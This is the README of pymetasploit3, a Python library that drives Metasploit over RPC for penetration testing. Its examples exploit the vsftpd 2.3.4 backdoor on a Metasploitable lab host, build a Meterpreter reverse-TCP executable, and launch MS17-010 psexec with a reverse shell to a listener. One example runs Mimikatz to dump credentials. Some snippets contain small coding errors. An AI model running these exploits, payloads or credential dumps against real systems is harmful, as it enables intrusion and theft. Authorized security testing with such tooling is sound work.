Pymetasploit3
=======

Pymetasploit3 is a full-fledged Python3 Metasploit automation library. It can interact with Metasploit either through msfrpcd or the msgrpc plugin in msfconsole.

# Original library: pymetasploit

This is an updated and improved version of the Python2 pymetasploit library by allfro.

Original project  : https://github.com/allfro/pymetasploit

# Installation

    mkdir your-project
    cd your-project
    pipenv install --three pymetasploit3
    pipenv shell

or:

    pip3 install --user pymetasploit3

# Basic Usage

## Starting Metasploit RPC server
You can start the RPC server either with ```msfrpcd``` or ```msfconsole```

### Msfconsole
This will start the RPC server on port 55552 as well as the Metasploit console UI
```bash
$ msfconsole
msf> load msgrpc [Pass=yourpassword]
```
### msfrpcd
This will start the RPC server on port 55553 and will just start the RPC server in the background
```bash
$ msfrpcd -P yourpassword -S
```

## RPC client

### Connecting to `msfrpcd`

```python
>>> from pymetasploit3.msfrpc import MsfRpcClient
>>> client = MsfRpcClient('yourpassword', ssl=True)
```
### Connecting to `msfconsole` with `msgrpc` plugin loaded

```python
>>> from pymetasploit3.msfrpc import MsfRpcClient
>>> client = MsfRpcClient('yourpassword', port=55552, True)
```

### MsfRpcClient

The `MsfRpcClient` class provides the core functionality to navigate through the Metasploit framework. Use
```dir(client)``` to see the callable methods.

```python
>>> [m for m in dir(client) if not m.startswith('_')]
['auth', 'authenticated', 'call', 'client', 'consoles', 'core', 'db', 'jobs', 'login', 'logout', 'modules', 'plugins',
'port', 'server', 'token', 'sessions', 'ssl', 'uri']
>>>
```

Like the metasploit framework, `MsfRpcClient` is segmented into different management modules:

* **`auth`**: manages the authentication of clients for the `msfrpcd` daemon.
* **`consoles`**: manages interaction with consoles/shells created by Metasploit modules.
* **`core`**: manages the Metasploit framework core.
* **`db`**: manages the backend database connectivity for `msfrpcd`.
* **`modules`**: manages the interaction and configuration of Metasploit modules (i.e. exploits, auxiliaries, etc.)
* **`plugins`**: manages the plugins associated with the Metasploit core.
* **`sessions`**: manages the interaction with Metasploit meterpreter sessions.

### Running an exploit

Explore exploit modules:

```python
>>> client.modules.exploits
['windows/wins/ms04_045_wins', 'windows/winrm/winrm_script_exec', 'windows/vpn/safenet_ike_11',
'windows/vnc/winvnc_http_get', 'windows/vnc/ultravnc_viewer_bof', 'windows/vnc/ultravnc_client', ...
'aix/rpc_ttdbserverd_realpath', 'aix/rpc_cmsd_opcode21']
>>>
```

Create an exploit module object:

```python
>>> exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
>>>
```

Explore exploit information:

```python
>>>  print(exploit.description)

          This module exploits a malicious backdoor that was added to the	VSFTPD download
          archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between
          June 30th 2011 and July 1st 2011 according to the most recent information
          available. This backdoor was removed on July 3rd 2011.

>>> exploit.options
['TCP::send_delay', 'ConnectTimeout', 'SSLVersion', 'VERBOSE', 'SSLCipher', 'CPORT', 'SSLVerifyMode', 'SSL', 'WfsDelay',
'CHOST', 'ContextInformationFile', 'WORKSPACE', 'EnableContextEncoding', 'TCP::max_send_size', 'Proxies',
'DisablePayloadHandler', 'RPORT', 'RHOSTS']
>>> exploit.missing_required # Required options which haven't been set yet
['RHOSTS']
>>>
```

Let's use a [Metasploitable 2](http://sourceforge.net/projects/metasploitable/) instance running on a VMWare
machine as our exploit target. It's running our favorite version of vsFTPd - 2.3.4 - and we already have our exploit
module loaded. Our next step is to specify our target:

```python
>>> exploit['RHOSTS'] = '172.16.14.145' # IP of our target host
>>>
```

Select a payload:

```python
>>> exploit.targetpayloads()
['cmd/unix/interact']
>>>
```

At this point, this exploit only supports one payload (`cmd/unix/interact`). So let's pop a shell:

```python
>>> exploit.execute(payload='cmd/unix/interact')
{'job_id': 1, 'uuid': '3whbuevf'}
>>>
```

We know the job ran successfully because `job_id` is `1`. If the module failed to execute for any reason, `job_id` would
 be `None`. If we managed to pop our box, we might see something nice in the sessions list:

```python
>>> client.sessions.list
{1: {'info': '', 'username': 'jsmith', 'session_port': 21, 'via_payload': 'payload/cmd/unix/interact',
'uuid': '5orqnnyv', 'tunnel_local': '172.16.14.1:58429', 'via_exploit': 'exploit/unix/ftp/vsftpd_234_backdoor',
'exploit_uuid': '3whbuevf', 'tunnel_peer': '172.16.14.145:6200', 'workspace': 'false', 'routes': '',
'target_host': '172.16.14.145', 'type': 'shell', 'session_host': '172.16.14.145', 'desc': 'Command shell'}}
>>>
```

### generate a payload

Create a payload module object:

```python
payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
```

View module information as described above

Setting runoptions and generate payload

```python
# set runoptions
payload.runoptions['BadChars'] = ''
payload.runoptions['Encoder'] = ''
payload.runoptions['Format'] = 'exe
payload.runoptions['NopSledSize'] = 0
payload.runoptions['ForceEncode'] = False
# payload.runoptions['Template'] = ''
payload.runoptions['Platform'] = ''
# payload.runoptions['KeepTemplateWorking'] = True
payload.runoptions['Iterations'] = 0

data = payload.payload_generate()
if isinstance(data, str):
    print(data)
else:
    with open('test.exe', 'wb') as f:
        f.write(data)
```

### Interacting with the shell
Create a shell object out of the session number we found above and write to it:

```python
>>> shell = client.sessions.session('1')
>>> shell.write('whoami')
>>> print(shell.read())
root
>>>
```

Run the same `exploit` object as before but wait until it completes and gather it's output:

```python
>>> cid = client.consoles.console().cid # Create a new console and store its number in 'cid'
>>> print(client.consoles.console(cid).run_module_with_output(exploit, payload='cmd/unix/interact'))
# Some time passes
'[*] 172.16.14.145:21 - Banner: 220 vsFTPd 2.3.4
[*] 172.16.14.145:21 - USER: 331 Please specify the password
...'

```

`client.sessions.session('1')` has the same `.write('some string')` and `.read()` methods, but running session commands and
 waiting until they're done returning output isn't as simple as console commands. The Metasploit RPC server will return
 a `busy` value that is `True` or `False` with `client.consoles.console('1').is_busy()` but determining if a
 `client.sessions.session()`  is done running a command requires us to do it by hand. For this purpose we will use a
 list of strings that, when any one is found in the session's output, will tell us that the session is done running
 its command. Below we are running the `arp` command within a meterpreter session. We know this command will return one
 large blob of text that will contain the characters `----` if it's successfully run so we put that into a list object.

 ```python
>>> session_id = '1'
>>> session_command = 'arp'
>>> terminating_strs = ['----']
>>> client.sessions.session(session_id).run_with_output(session_command, terminating_strs)
# Some time passes
'\nARP Table\n                  ---------------\n  ...`
```
Run a PowerShell script with output
```python
>>> session_id = '1'
>>> psh_script_path  = '/home/user/scripts/Invoke-Mimikatz.ps1'
>>> session = c.sessions.session(sessions_id)
>>> sessions.import_psh(psh_script_path)
>>> sessions.run_psh_cmd('Invoke-Mimikatz')
# Some time passes
'Mimikatz output...'
```

One can also use a timeout and simply return all data found before the timeout expired. `timeout` defaults to
Metasploit's comm timeout of 300s and will throw an exception if the command timed out. To change this, set
 `timeout_exception` to `False` and the library will simply return all the data from the session output it found before
 the timeout expired.
 ```python
>>> session_id = '1'
>>> session_command = 'arp'
>>> terminating_strs = ['----']
>>> client.sessions.session(session_id).run_with_output(session_command, terminating_strs, timeout=10, timeout_exception=False))
# 10s pass
'\nARP Table\n                  ---------------\n  ...`
```

### Configuring payload options

For some usecases you might need to specify payload options, here's an example on how to do so.

	exploit = client.modules.use('exploit', 'windows/smb/ms17_010_psexec')
	exploit['RHOSTS'] = '172.28.128.13'
	payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
	payload['LHOST'] = '172.28.128.1'
	payload['LPORT'] = 4444
	exploit.execute(payload=payload)


### More examples

Many other usage examples can be found in the `example_usage.py` file.

# Contributions

I highly encourage contributors to send in any and all pull requests or issues. Thank you to allfro for writing
the original pymetasploit library.
